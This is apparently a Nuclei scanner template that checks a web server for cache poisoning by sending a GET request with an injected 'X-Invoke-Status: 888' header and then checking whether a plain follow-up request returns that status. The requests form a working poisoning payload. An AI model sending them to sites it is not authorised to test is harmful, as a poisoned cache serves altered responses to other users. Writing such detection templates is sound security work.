id: cache-poisoning-invoke
info:
  name: "invoke Cache Poisoning"
  author: banditz
  severity: high

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        X-Invoke-Status: 888

    matchers:
      - type: dsl
        dsl:
          - status_code == 888
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - status_code == 888
